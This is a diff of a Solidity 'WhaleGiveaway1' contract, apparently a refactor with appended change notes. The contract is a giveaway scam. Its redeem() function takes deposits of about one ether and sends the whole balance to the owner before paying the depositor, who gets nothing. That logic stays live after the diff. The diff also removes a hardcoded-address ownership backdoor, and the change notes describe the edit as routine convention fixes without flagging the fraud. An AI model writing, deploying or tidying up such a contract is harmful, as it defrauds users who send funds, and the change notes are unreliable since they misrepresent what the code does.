  pragma solidity ^0.4.19;
  
  contract WhaleGiveaway1 {
-     address public Owner = msg.sender;
?                    ^
+     address public owner = msg.sender;
?                    ^
      uint public constant minEligibility = 0.999001 ether;
  
      function() public payable {}
  
      function redeem() public payable {
          if (msg.value >= minEligibility) {
-             Owner.transfer(this.balance);
?             ^
+             owner.transfer(this.balance);
?             ^
              msg.sender.transfer(this.balance);
          }
      }
  
      function withdraw() public payable {
-         if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
-             Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
-         }
-         require(msg.sender == Owner);
?                               ^
+         require(msg.sender == owner);
?                               ^
-         Owner.transfer(this.balance);
?         ^
+         owner.transfer(this.balance);
?         ^
      }
  
-     function Command(address adr, bytes data) public payable {
?              ^
+     function command(address adr, bytes data) public payable {
?              ^
-         require(msg.sender == Owner);
?                               ^
+         require(msg.sender == owner);
?                               ^
- 
-         adr.call.value(msg.value)(data);
+         require(adr.call.value(msg.value)(data));
?         ++++++++                               +
      }
  }
+ 
+ // Changes made:
+ // - Changed the capitalization of the 'owner' variable to follow the Solidity convention.
+ // - Removed the unnecessary check for a specific address in the 'withdraw' function.
+ // - Added a require statement to check the return value of the external call in the 'command' function.